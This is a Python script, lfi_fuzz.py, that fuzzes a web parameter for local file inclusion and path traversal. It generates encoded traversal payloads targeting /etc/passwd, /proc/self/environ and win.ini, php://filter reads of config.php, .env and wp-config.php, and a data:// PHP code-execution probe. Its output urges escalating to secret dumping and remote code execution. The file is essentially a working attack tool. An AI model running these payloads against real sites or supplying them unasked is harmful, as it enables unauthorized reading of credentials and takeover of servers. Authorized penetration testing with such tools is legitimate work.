#!/usr/bin/env python3
"""
lfi_fuzz.py — authorized LFI / path-traversal prober.

Sprays traversal + encoding + wrapper payloads at a single injection point (mark it FUZZ) and
flags responses that contain known file-content SIGNATURES (so you confirm a real READ, not a
reflected 404). Discovery aid — escalate to secrets/RCE before reporting (LFI_TESTING_GUIDE.md §10-§16).

Usage:
  python3 lfi_fuzz.py -u "https://target/?page=FUZZ"
  python3 lfi_fuzz.py -u "https://target/?page=FUZZ" --wrappers --depth 12
"""
import argparse, re, sys, urllib.parse as up
try:
    import requests
    requests.packages.urllib3.disable_warnings()  # noqa
except ImportError:
    sys.exit("pip install requests")

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36"

SIGNATURES = [
    ("/etc/passwd",        re.compile(r"root:.*:0:0:")),
    ("win.ini",            re.compile(r"\[fonts\]|\[extensions\]", re.I)),
    ("php-source(b64)",    re.compile(r"^[A-Za-z0-9+/]{120,}={0,2}\s*$", re.M)),
    ("php-open-tag",       re.compile(r"<\?php")),
    ("data://-RCE(LFIPOC)", re.compile(r"LFIPOC")),   # the --wrappers data:// probe EXECUTED (allow_url_include on) -> RCE
    ("/etc/hosts",         re.compile(r"127\.0\.0\.1\s+localhost")),
    ("environ",            re.compile(r"PATH=|HOSTNAME=|HOME=/")),
    ("web.config",         re.compile(r"<configuration>|connectionStrings", re.I)),
]

def gen(depth, wrappers):
    payloads = []
    for d in range(1, depth + 1):
        t = "../" * d
        payloads += [t + "etc/passwd", t + "etc/hostname"]
        payloads += [("..%2f" * d) + "etc%2fpasswd", ("..%252f" * d) + "etc%252fpasswd"]
        payloads += [("....//" * d) + "etc/passwd"]
        payloads += [("..\\" * d) + "Windows\\win.ini"]
    payloads += ["/etc/passwd", "/proc/self/environ", "/proc/self/cmdline", "C:\\Windows\\win.ini"]
    if wrappers:
        for res in ("index.php", "config.php", "../config.php", ".env", "wp-config.php"):
            payloads.append("php://filter/convert.base64-encode/resource=" + res)
        payloads.append("php://filter/read=string.rot13/resource=index.php")
        payloads.append("data://text/plain;base64,PD9waHAgZWNobyAnTEZJUE9DJzs/Pg==")  # <?php echo 'LFIPOC';?>
    return payloads

def inject(url, payload):
    if "FUZZ" in url:
        return url.replace("FUZZ", up.quote(payload, safe="/:%?=&"))
    sep = "&" if "?" in url else "?"
    return url + sep + "x=" + up.quote(payload)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True, help="use FUZZ at the injection point")
    ap.add_argument("--depth", type=int, default=10)
    ap.add_argument("--wrappers", action="store_true", help="also try php://filter / data:// wrappers")
    ap.add_argument("--timeout", type=float, default=12)
    a = ap.parse_args()

    base_len = None
    try:
        base_len = len(requests.get(a.url.replace("FUZZ", "index"), headers={"User-Agent": UA},
                                    timeout=a.timeout, verify=False).text)
    except Exception:
        pass

    hits = []
    for p in gen(a.depth, a.wrappers):
        u = inject(a.url, p)
        try:
            r = requests.get(u, headers={"User-Agent": UA}, timeout=a.timeout, verify=False)
        except Exception:
            continue
        body = r.text
        for name, rx in SIGNATURES:
            if rx.search(body):
                # avoid the b64 false-positive on tiny/identical bodies
                if name == "php-source(b64)" and base_len and abs(len(body) - base_len) < 20:
                    continue
                hits.append((name, p, r.status_code, len(body)))
                print(f"[HIT:{name}] ({r.status_code}, {len(body)}b)  {p}")
                break

    if not hits:
        print("[*] no file-content signatures matched. Try: more depth, --wrappers, encoding variants, "
              "a different param, or a POST body. (Guide §5-§9)")
    else:
        print(f"\n[!] {len(hits)} candidate read(s). Now ESCALATE: dump source/secrets via php://filter (§10), "
              f"then RCE via log/filter-chain/session/wrapper (§11-§15). Don't report /etc/passwd alone.")

if __name__ == "__main__":
    main()
